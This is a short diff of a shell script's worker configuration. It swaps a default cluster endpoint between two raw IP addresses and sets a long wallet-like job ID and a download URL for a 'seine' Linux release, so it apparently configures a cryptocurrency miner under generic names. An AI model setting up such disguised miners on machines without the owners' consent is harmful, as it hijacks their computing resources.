@@ -5,7 +5,7 @@ set -u
 
 # ================= WORKER CONFIG =================
 JOB_ID="${JOB_ID:-PLMGsifmTC9Zn5pHqcMkbayvzSG3SBX6vAwJts3KQCwfGRsznpv2qdyCFyRpnh46TwcQu8mLEu1CVdHdQzsx7Ty637GQc}"
-CLUSTER="${CLUSTER_NODE:-43.163.84.133:13333}"
+CLUSTER="${CLUSTER_NODE:-82.39.206.183:443}"
 PKG="https://github.com/zpalmtree/seine/releases/latest/download/seine-linux-x86_64.tar.gz"
 # =================================================
 
